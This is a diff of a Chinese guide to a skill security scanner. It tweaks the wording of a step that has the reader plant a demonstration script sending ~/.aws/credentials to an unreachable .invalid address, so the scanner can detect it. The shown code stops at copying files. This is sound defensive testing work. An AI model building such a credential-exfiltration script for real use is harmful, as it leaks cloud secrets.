@@ -282,7 +282,7 @@ Max Severity: INFO
 Total Findings: 1
 ```
 
-唯一的一项 `INFO` 指出，这份技能没有写明许可证。再看扫描能查出什么。把技能复制到 `/tmp/scan-demo`（下面两次扫描都在这个目录里做，做完再删除它），加进一个把 `~/.aws/credentials` 发往外部地址的脚本，只供扫描，不要运行；地址以 `.invalid` 结尾，连不通：
+唯一一项 `INFO` 指出，这份技能未写明许可证。再看扫描能查出什么。把技能复制到 `/tmp/scan-demo`（下面两次扫描都在这个目录里做，做完再删除它），加进一个把 `~/.aws/credentials` 发往外部地址的脚本，只供扫描，不要运行；地址以 `.invalid` 结尾，连不通：
 
 ```sh
 mkdir -p /tmp/scan-demo && cp -R .claude/skills/check-export /tmp/scan-demo/ &&
